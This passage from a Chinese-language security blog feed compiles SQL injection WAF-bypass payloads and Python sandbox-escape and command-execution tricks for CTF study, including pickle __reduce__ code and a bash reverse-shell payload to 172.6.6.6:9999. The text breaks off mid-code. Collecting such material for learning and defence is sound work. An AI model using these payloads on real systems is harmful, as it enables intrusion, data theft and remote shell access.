        <content type="html"><![CDATA[<blockquote><p>之前对sql注入的原理方面的梳理比较多，现在打算对sql的Bypass技巧进行一个小小的总结，这里的技术是笔者进行了大量资料的阅读以及亲自实践，总结的是很不全面，有兴趣的可以继续对参考链接进行更深的学习。<br><a id="more"></a></p><h1 id="SQL-Bypass"><a href="#SQL-Bypass" class="headerlink" title="SQL Bypass"></a>SQL Bypass</h1><ol><li>大小写绕过<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sElECt</span> * <span class="keyword">FrOM</span> <span class="keyword">TEST</span>;</span><br></pre></td></tr></table></figure></li></ol></blockquote><ol><li><p>特殊执行</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#特殊代码执行</span></span><br><span class="line">/*!select*/ * /*!from*/ /*!test*/</span><br></pre></td></tr></table></figure></li><li><p>注释绕过</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#普通注释</span></span><br><span class="line"><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">select</span><span class="comment">/*b*/</span>*<span class="comment">/*c*/</span><span class="keyword">from</span><span class="comment">/*d*/</span><span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">select</span><span class="comment">/*b`123*/</span>*<span class="comment">/*c`123*/</span><span class="keyword">from</span><span class="comment">/*d`123*/</span><span class="keyword">test</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#内联注释,版本执行</span></span><br><span class="line">/*！50000select*/ * /*!50000from*/ test</span><br></pre></td></tr></table></figure></li><li><p>利用DBMS的内置函数(加解密，编码与反编码函数,进制转换，转义<code>\</code>)<br>编码：<br><code>hex()</code><br><code>bin()</code><br><code>ascii()</code><br><code>char()/chr()</code><br><code>ord()</code><br><code>unhex()</code><br>加解密函数：<a href="https://dev.mysql.com/doc/refman/8.0/en/encryption-functions.html" target="_blank" rel="noopener">mysql内置的加解密函数</a>  </p></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用char支持最大4个字符的特性，进行字符串拼接,字符串的数字值可由select hex("pass"),select hex("word")求出</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">1885434739</span>),<span class="built_in">char</span>(<span class="number">2003792484</span>)) ;<span class="comment">--select password</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">concat</span>(<span class="built_in">char</span>(x<span class="string">'70617373'</span>),<span class="built_in">char</span>(b<span class="string">'1110111011011110111001001100100'</span>)) <span class="comment">#"password"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用‘\’进行关键字转义</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">'he\l\lo'</span>=<span class="string">'hello'</span> <span class="comment">--SELECT 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用extractvalue()</span></span><br><span class="line"><span class="keyword">SELECT</span>(extractvalue(<span class="number">0x3C613E61646D696E3C2F613E</span>,<span class="number">0x2f61</span>));  <span class="comment">--select admin;</span></span><br></pre></td></tr></table></figure><ol><li><p>运算符绕过<br>针对不同的DBMS，其操作符不一样，在某些字符串被filter掉的时候，我们可以尝试使用operators<br><a href="https://www.postgresql.org/docs/6.5/static/operators1716.htm" target="_blank" rel="noopener">https://www.postgresql.org/docs/6.5/static/operators1716.htm</a><br><a href="https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html</a><br><a href="https://docs.oracle.com/html/A95915_01/sqopr.htm" target="_blank" rel="noopener">https://docs.oracle.com/html/A95915_01/sqopr.htm</a>   </p></li><li><p>HPP/HPF/HPC(详情参看之前写的文章——<a href="http://lypto.me/2017/11/23/SQL%E6%8D%A3%E9%BC%93/">sql注入捣鼓</a></p></li><li><p>中介角色<br>可以使用php这样的脚本语言来进行fuzz  </p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$link = mysql_connect(<span class="string">'server'</span>, <span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">mysql_select_db(<span class="string">'database'</span>, $link);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i&lt;= <span class="number">255</span>;$i++) &#123;</span><br><span class="line">$chr = chr($i);</span><br><span class="line"><span class="keyword">for</span>($j = <span class="number">0</span>; $j&lt;=<span class="number">255</span>;$j++) &#123;</span><br><span class="line">$chr2 = chr($j);</span><br><span class="line"><span class="keyword">if</span>(mysql_query(<span class="string">'SELECT'</span>.$chr.<span class="string">'1'</span>.$chr2.<span class="string">''</span>, $link)) &#123;</span><br><span class="line"><span class="keyword">echo</span> dechex($i).<span class="string">','</span>.dechex($j).<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125; &#125; &#125;</span><br></pre></td></tr></table></figure><p>结果：<br><img src="/myimages/bypass/sql_intermediary.png" alt="IMAGES"><br>更多的细节可以参考 <a href="https://websec.ca/kb/sql_injection#MySQL_Fuzzing_Obfuscation" target="_blank" rel="noopener">https://websec.ca/kb/sql_injection#MySQL_Fuzzing_Obfuscation</a>    </p><ol><li>编码绕过</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#URL Encoding</span></span><br><span class="line"><span class="keyword">SELECT</span> %<span class="number">74</span>able_%<span class="number">6</span>eame <span class="keyword">FROM</span> information_schema.tables;</span><br><span class="line"><span class="comment">#Double URL Encoding</span></span><br><span class="line"><span class="keyword">SELECT</span> %<span class="number">2574</span>able_%<span class="number">256</span>eame <span class="keyword">FROM</span> information_schema.tables;</span><br><span class="line"><span class="comment">#Unicode Encoding</span></span><br><span class="line"><span class="keyword">SELECT</span> %u0074able_%u6eame <span class="keyword">FROM</span> information_schema.tables;</span><br><span class="line"><span class="comment">#Invalid Hex Encoding (ASP)</span></span><br><span class="line"><span class="keyword">SELECT</span> %tab%le_%na%me <span class="keyword">FROM</span> information_schema.tables;</span><br></pre></td></tr></table></figure><ol><li>mysql的弱类型</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0</span>=<span class="string">'hello'</span>;  <span class="comment"># true</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>=<span class="string">'hello'</span>;  <span class="comment"># false</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>=<span class="string">'1hello'</span>; <span class="comment">#true</span></span><br></pre></td></tr></table></figure><ol><li><p>避开使用关键字的正则绕过技巧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#Spaces</span><br><span class="line">SELECT schema_name FROM information_schema .    schemata; </span><br><span class="line">#Backticks</span><br><span class="line">SELECT schema_name FROM `information_schema`.`schemata`; </span><br><span class="line">#Alternative Names(别名)，注意到以下几个表格的内容并不是完全一致，而是存在有细微的差别，主要体现在键值的影响上。</span><br><span class="line">information_schema.table=</span><br><span class="line">information_schema.partitions=   </span><br><span class="line">information_schema.statistics=  </span><br><span class="line">information_schema.key_column_usage=   </span><br><span class="line">information_schema.table_constraints</span><br></pre></td></tr></table></figure></li><li><p>字符的连接方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">'a'</span> <span class="string">'d'</span> <span class="string">'mi'</span> <span class="string">'n'</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'a'</span>, <span class="string">'d'</span>, <span class="string">'m'</span>, <span class="string">'i'</span>, <span class="string">'n'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CONCAT_WS</span>(<span class="string">''</span>, <span class="string">'a'</span>, <span class="string">'d'</span>, <span class="string">'m'</span>, <span class="string">'i'</span>, <span class="string">'n'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">GROUP_CONCAT</span>(<span class="string">'a'</span>, <span class="string">'d'</span>, <span class="string">'m'</span>, <span class="string">'i'</span>, <span class="string">'n'</span>);</span><br></pre></td></tr></table></figure></li><li><p>摘录一下网上的一些前辈总结得比较好的bypass语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">***note***:"====&gt;"左边表示会被Filtered的语句，"=&gt;"右边表示成功Bypass的语句，左边标红的为被Filtered的关键字，右边标蓝的为替代其功能的函数或关键字</span><br><span class="line"><span class="comment">#filter and or</span></span><br><span class="line">and =&gt; &amp;&amp; 　　or =&gt; ||</span><br><span class="line"></span><br><span class="line"><span class="comment">#filter union</span></span><br><span class="line">union <span class="keyword">select</span> <span class="keyword">user</span>, <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span>　====&gt;　　<span class="number">1</span>||(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id = <span class="number">1</span>) = <span class="string">'admin </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#filter where</span></span><br><span class="line"><span class="string">1 || (select user from users where user_id = 1) = '</span><span class="keyword">admin</span><span class="string">'　====&gt;　　1||(select user from users limit 1) = '</span><span class="keyword">admin</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># filter limit</span></span><br><span class="line"><span class="number">1</span> || (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>) = <span class="string">'admin'</span> ====&gt;　<span class="number">1</span>||(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># filter group by</span></span><br><span class="line"><span class="number">1</span> || (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span>   ====&gt;　<span class="number">1</span>||(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">group_concat</span>(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> )=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># filter select </span></span><br><span class="line"><span class="number">1</span> || (<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">group_concat</span>(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span>) = <span class="number">1</span>  ====&gt;<span class="number">1</span>||<span class="number">1</span> = <span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'result.txt'</span>　或者  <span class="number">1</span> || <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="string">'a'</span>　</span><br><span class="line"><span class="number">1</span> || (<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">group_concat</span>(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span>) = <span class="number">1</span> 　 ====&gt;　　<span class="number">1</span>||user_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> 或者 <span class="number">1</span>||<span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x61</span> 或者 <span class="number">1</span>||<span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">unhex</span>(<span class="number">61</span>)　　</span><br><span class="line">　　　</span><br><span class="line"><span class="comment"># filter hex</span></span><br><span class="line"><span class="number">1</span>||<span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">unhex</span>(<span class="number">61</span>)　====&gt;<span class="number">1</span>||<span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">lower</span>(<span class="keyword">conv</span>(<span class="number">11</span>,<span class="number">10</span>,<span class="number">36</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># filter substr</span></span><br><span class="line"><span class="number">1</span>||<span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">lower</span>(<span class="keyword">conv</span>(<span class="number">11</span>,<span class="number">10</span>,<span class="number">36</span>))   ====&gt;　　<span class="number">1</span>||<span class="keyword">lpad</span>(<span class="keyword">user</span>,<span class="number">7</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://websec.ca/kb/sql_injection#MySQL_String_Concatenation" target="_blank" rel="noopener">https://websec.ca/kb/sql_injection#MySQL_String_Concatenation</a><br><a href="https://github.com/trietptm/SQL-Injection-Payloads/blob/master/LINKS.md" target="_blank" rel="noopener">https://github.com/trietptm/SQL-Injection-Payloads/blob/master/LINKS.md</a><br><a href="https://dev.mysql.com/doc/refman/8.0/en/encryption-functions.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/encryption-functions.html</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF" target="_blank" rel="noopener">https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF</a><br><a href="https://medium.com/bugbountywriteup/sql-injection-in-ctf-bef1ae0c5d9b" target="_blank" rel="noopener">https://medium.com/bugbountywriteup/sql-injection-in-ctf-bef1ae0c5d9b</a><br><a href="https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html</a><br><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#SyntaxBasicAttacks" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#SyntaxBasicAttacks</a><br><a href="https://www.exploit-db.com/papers/17934/" target="_blank" rel="noopener">https://www.exploit-db.com/papers/17934/</a><br><a href="https://epdf.tips/web-application-obfuscation-wafsevasionfilters-alert-obfuscation-.html" target="_blank" rel="noopener">PDF : tips_web-application-obfuscation-wafsevasion</a></p>]]></content>
      
      
      <categories>
          
          <category> bypass </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> bypass </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python沙箱绕过相关</title>
      <link href="/2018/07/31/python%E6%B2%99%E7%AE%B1/"/>
      <url>/2018/07/31/python%E6%B2%99%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在看到一些python命令执行的ctf题目的时候，才发现原来自己对python的了解还是那么的浅，但是基于python的web框架也日益盛行，python的命令执行是个需要好好学习的一个知识点，常见的漏洞利用方式或者说CTF的题目有SSTI，python沙箱绕过类pwn,所以为了恶补一下之前没有认真对待的python内置方法和魔术方法这些比较容易忽略的细节，现在把相关知识点总结如下。<br><a id="more"></a></p><h1 id="payload搜集"><a href="#payload搜集" class="headerlink" title="payload搜集"></a>payload搜集</h1><h2 id="沙箱绕过中常用的os模块导入和命令执行姿势"><a href="#沙箱绕过中常用的os模块导入和命令执行姿势" class="headerlink" title="沙箱绕过中常用的os模块导入和命令执行姿势"></a>沙箱绕过中常用的os模块导入和命令执行姿势</h2><p>python的object类中集成了很多的基础函数，我们想要调用的时候也是可以通过创建对象进而引用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2：</span></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">61</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">40</span>](filename).read()</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">29</span>].__call__(eval,<span class="string">'os.system("ls")'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1"'</span>)</span><br><span class="line"></span><br><span class="line">python3：</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>]</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">117</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'__global'</span>+<span class="string">'s__'</span>)[<span class="string">'os'</span>].__dict__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="其他python命令执行的姿势"><a href="#其他python命令执行的姿势" class="headerlink" title="其他python命令执行的姿势"></a>其他python命令执行的姿势</h2><h3 id="导入os模块"><a href="#导入os模块" class="headerlink" title="导入os模块"></a>导入os模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system() </span><br><span class="line">os.popen()</span><br></pre></td></tr></table></figure><h3 id="导入commands模块"><a href="#导入commands模块" class="headerlink" title="导入commands模块"></a>导入commands模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import commands</span><br><span class="line">commands.getstatusoutput() </span><br><span class="line">commands.getoutput()</span><br><span class="line">commands.getstatus()</span><br></pre></td></tr></table></figure><h3 id="导入subprocess模块"><a href="#导入subprocess模块" class="headerlink" title="导入subprocess模块"></a>导入subprocess模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.call(command, shell=True) </span><br><span class="line">subprocess.Popen(command, shell=True)</span><br><span class="line">subprocess.check_output(command, shell=True)</span><br></pre></td></tr></table></figure><h3 id="导入pty"><a href="#导入pty" class="headerlink" title="导入pty"></a>导入pty</h3><p>这个地方很多时候可以用来进行反弹shell的操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import pty</span><br><span class="line">pty.spawn()</span><br><span class="line"></span><br><span class="line">#例子：</span><br><span class="line">import pty</span><br><span class="line">pty.spawn(&apos;/bin/bash&apos;)</span><br></pre></td></tr></table></figure></p><h3 id="内置函数execfile-可以用来执行一个二进制文件"><a href="#内置函数execfile-可以用来执行一个二进制文件" class="headerlink" title="内置函数execfile()可以用来执行一个二进制文件"></a>内置函数execfile()可以用来执行一个二进制文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">execfile(filename[, globals[, locals]])</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">参数</span><br><span class="line">filename -- 文件名。</span><br><span class="line">globals -- 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</span><br><span class="line">locals -- 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</span><br><span class="line">返回值</span><br><span class="line">返回表达式执行结果。</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#例子：</span><br><span class="line">execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br></pre></td></tr></table></figure><h3 id="导入timeit模块，间接执行命令"><a href="#导入timeit模块，间接执行命令" class="headerlink" title="导入timeit模块，间接执行命令"></a>导入timeit模块，间接执行命令</h3><p>注意到这个模块中主要有以下两个函数，都可以执行命令，后者可以执行一个命令多次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">timeit(stmt=&apos;pass&apos;, setup=&apos;pass&apos;, timer=&lt;defaulttimer&gt;, number=1000000)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">返回：</span><br><span class="line">    返回执行stmt这段代码number遍所用的时间，单位为秒，float型</span><br><span class="line">参数：</span><br><span class="line">    stmt：要执行的那段代码</span><br><span class="line">    setup：执行代码的准备工作，不计入时间，一般是import之类的</span><br><span class="line">    timer：这个在win32下是time.clock()，linux下是time.time()，默认的，不用管</span><br><span class="line">    number：要执行stmt多少遍</span><br><span class="line">    </span><br><span class="line"> repeat(stmt=&apos;pass&apos;, setup=&apos;pass&apos;, timer=&lt;defaulttimer&gt;, repeat=3, number=1000000)</span><br><span class="line">这个函数比timeit函数多了一个repeat参数而已，表示重复执行timeit这个过程多少遍，返回一个列表，表示执行每遍的时间</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">#例子：</span><br><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1)</span><br></pre></td></tr></table></figure></p><h3 id="内置函数eval和exec"><a href="#内置函数eval和exec" class="headerlink" title="内置函数eval和exec"></a>内置函数eval和exec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">描述</span><br><span class="line">eval() 函数用来执行一个字符串表达式，并返回表达式的值。</span><br><span class="line">语法</span><br><span class="line">以下是 eval() 方法的语法:</span><br><span class="line">eval(expression[, globals[, locals]])</span><br><span class="line">参数</span><br><span class="line">expression -- 表达式。</span><br><span class="line">globals -- 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</span><br><span class="line">locals -- 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</span><br><span class="line">返回值</span><br><span class="line">返回表达式计算结果。</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#例子：</span><br><span class="line">eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br><span class="line"></span><br><span class="line">#exec 执行储存在字符串或文件中的Python语句，相比于 eval，exec可以执行更复杂的Python代码，但是需要注意的是python3与python2的细微差别。</span><br><span class="line">#例子1（python3）：</span><br><span class="line">exec(&apos;print(&quot;Hello World&quot;)&apos;)</span><br><span class="line">#例子2（python2）</span><br><span class="line">exec&apos;print &quot;Hello World&quot;&apos;</span><br></pre></td></tr></table></figure><h3 id="platform库函数"><a href="#platform库函数" class="headerlink" title="platform库函数"></a>platform库函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">platform.popen() #执行cmd</span><br><span class="line">platform.platform() # 返回操作系统平台</span><br><span class="line">platform.uname() # 返回操作系统信息</span><br><span class="line">platform.system() # 返回操作系统平台</span><br><span class="line">platform.version() # 返回操作系统版本</span><br><span class="line">platform.machine() # 返回计算机类型</span><br><span class="line">platform.processor() # 返回计算机处理器类型</span><br><span class="line">platform.node() # 返回计算机网络名</span><br><span class="line">platform.python_version() # 返回Python版本号</span><br></pre></td></tr></table></figure><h3 id="pickle命令执行"><a href="#pickle命令执行" class="headerlink" title="pickle命令执行"></a>pickle命令执行</h3><h4 id="重写-reduce-方法"><a href="#重写-reduce-方法" class="headerlink" title="重写__reduce__方法"></a>重写<code>__reduce__</code>方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import cPickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class genpoc(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        s = &quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;  #要执行的命令</span><br><span class="line">        return os.system, (s,)        #os.system(&quot;echo test &gt;poc.txt&quot;)</span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = cPickle.dumps(e)</span><br><span class="line"></span><br><span class="line">print poc</span><br></pre></td></tr></table></figure><h4 id="运用marshal-pickle-code类型对象"><a href="#运用marshal-pickle-code类型对象" class="headerlink" title="运用marshal pickle code类型对象"></a>运用marshal pickle code类型对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 